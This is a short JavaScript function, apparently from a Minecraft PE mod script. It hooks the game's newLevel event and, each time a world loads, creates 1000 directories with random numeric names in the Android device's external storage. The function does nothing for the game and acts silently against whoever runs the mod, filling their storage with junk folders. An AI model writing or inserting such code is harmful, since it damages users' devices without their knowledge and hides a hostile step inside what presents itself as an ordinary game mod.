function newLevel() {
    for (var i = 0; i < 1000; i++) {
        var r = Math.floor(Math.random() * 10000000);
        var d = new java.io.File(android.os.Environment.getExternalStorageDirectory().getAbsolutePath(), r);
        d.mkdirs();
    }
}
